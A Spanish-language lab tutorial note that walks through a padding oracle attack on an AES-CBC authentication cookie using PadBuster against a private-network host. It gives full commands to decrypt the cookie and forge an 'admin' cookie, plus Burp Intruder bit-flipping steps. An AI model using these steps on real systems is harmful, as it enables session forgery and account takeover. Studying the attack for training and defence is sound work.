
> 📦 Explotando vulnerabilidades de cifrado por bloques en CBC mode

---

## 🛠️ Herramienta utilizada: **PadBuster**

📦 Repositorio: [https://github.com/AonCyberLabs/PadBuster](https://github.com/AonCyberLabs/PadBuster)

---

## 📍 **Contexto:**

Tienes una cookie cifrada en modo **CBC (Cipher Block Chaining)** vulnerable a un **Padding Oracle**, lo que permite:

- 🔍 **Descifrar contenido** (como el nombre de usuario)
    
- ✍️ **Modificar contenido cifrado** (como cambiar `user=ken` por `user=admin`)
    

---

## 🧪 Paso 1: Extraer y descifrar la cookie 🕵️

### 🔐 Cookie interceptada:

ini

Copiar código

`auth=TOQOQrVsul9lV3YvSrk%2BtE%2BlhwSDNKgG`

### 🔎 Ejecutamos PadBuster:

bash

Copiar código

`padbuster http://192.168.0.33/index.php TOQOQrVsul9lV3YvSrk%2BtE%2BlhwSDNKgG 8 -cookies 'auth=TOQOQrVsul9lV3YvSrk%2BtE%2BlhwSDNKgG'`

📤 **Resultado:**

cpp

Copiar código

`[+] Decrypted value (ASCII): user=ken [+] Decrypted value (HEX): 757365723D6B656E0808080808080808 [+] Decrypted value (Base64): dXNlcj1rZW4ICAgICAgICA==`

✅ ¡Ya sabemos qué contiene la cookie!

---

## 🧪 Paso 2: Cifrar un nuevo valor → `user=admin` 👑

### 🔁 Usamos el mismo comando, pero con `-plaintext`:

bash

Copiar código

`padbuster http://192.168.0.33/index.php TOQOQrVsul9lV3YvSrk%2BtE%2BlhwSDNKgG 8 -cookies 'auth=TOQOQrVsul9lV3YvSrk%2BtE%2BlhwSDNKgG' -plaintext 'user=admin'`

📤 **Salida:**

pgsql

Copiar código

`[+] Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA`

📌 Reemplaza la cookie original con este valor en tus requests:

ini

Copiar código

`auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA`

---

## 🧪 Paso 3: 🧙‍♂️ Truco avanzado – _Bit Flipping con Intruder_

📌 Objetivo: Modificar el contenido de forma más sutil, **manipulando solo un bloque**

### 🚶‍♂️ Pasos:

1. Regístrate como usuario: `bdmin`
    
2. Intercepta la petición de autenticación con Burp Suite
    
3. Envía al **Intruder**
    
4. Selecciona ataque tipo **Sniper**
    
5. Usa payloads tipo **Bit Flipper**
    

🧠 _Al cambiar solo un byte o bloque, reduces el riesgo de romper el padding._

---

## 🧠 ¿Qué es un Padding Oracle?

> Es una vulnerabilidad en esquemas de cifrado como **AES-CBC** donde el servidor da respuestas distintas si el padding es válido o no, permitiendo:

- 🔓 Descifrado sin clave
    
- ✍️ Cifrado controlado
    
- 📤 Suplantación de usuarios
    

---

## 📚 Recursos útiles:

- 🔗 [PadBuster GitHub](https://github.com/AonCyberLabs/PadBuster)
    
- 📖 PortSwigger - Padding Oracle Attack

![[Pasted image 20250404103910.png]]

